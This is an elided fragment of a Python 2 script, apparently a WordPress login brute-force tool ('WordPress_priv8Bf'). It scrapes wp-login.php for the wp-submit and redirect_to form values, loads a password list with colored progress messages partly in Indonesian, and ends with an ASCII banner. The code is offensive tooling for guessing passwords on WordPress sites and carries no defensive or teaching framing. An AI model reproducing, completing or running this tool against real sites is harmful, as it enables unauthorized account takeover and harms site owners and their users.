...
class WordPress_priv8Bf(object):
    def __init__(self):
        ...
        try:
            ...
            print self.c + '       [' + self.y + '+' + self.c + ']' + self.w + \
                  ' [Trying to Get Wp-login.php SourceCode] ' + self.g + ' [OKE]'
            time.sleep(0.5)
        except:
            print self.c + '       [' + self.y + '-' + self.c + ']' + self.w + \
        ...
        try:
            ...
            print self.c + '       [' + self.y + '+' + self.c + ']' + self.w + \
                  ' [Trying to Get WpSubmit Value From SourceCode] ' + self.g + ' [OKE]'
            time.sleep(0.5)

        except:
            print self.c + '       [' + self.y + '-' + self.c + '] ' + self.w + \
                  ' [Trying to Get WpSubmit Value From SourceCode] ' + self.r + ' [NOT]'
            sys.exit()
        try:
            WpRedirctTo = re.findall('name="redirect_to" value="(.*)"', source)[0]
            print self.c + '       [' + self.y + '+' + self.c + ']' + self.w + \
                  ' [Trying to Get WpRedirctTo Value From SourceCode] ' + self.g + ' [OKE]'
            time.sleep(0.5)

        except:
            print self.c + '       [' + self.y + '-' + self.c + ']' + self.w + \
                  ' [Trying to Get WpRedirctTo Value From SourceCode] ' + self.r + ' [NOT]'
            sys.exit()
        ...
        try:
            ...
            print self.c + '       [' + self.y + '+' + self.c + '] ' + self.g + \
                  str(len(passfile)) + self.c + ' Passwords ditemukan mek!'
            time.sleep(2)
        except:
            print self.c + '       [' + self.y + '-' + self.c + ']' + self.w + \
                  ' [Password list] ' + self.r + ' [NOT]'
            sys.exit()
    ...
    def print_logo(self):
        ...
        x = """
              ...
              _____          _                 __  ______          _     _____
             |  ___|_ _ _ __| |__   __ _ _ __  \ \/ / ___|___   __| | __|___  |
             | |_ / _` |  __| |_ \ / _` |  _ \  \  / |   / _ \ / _` |/ _ \ / /
             |  _| (_| | |  | | | | (_| | | | | /  \ |__| (_) | (_| |  __// /
             |_|  \__,_|_|  |_| |_|\__,_|_| |_|/_/\_\____\___/ \__,_|\___/_/
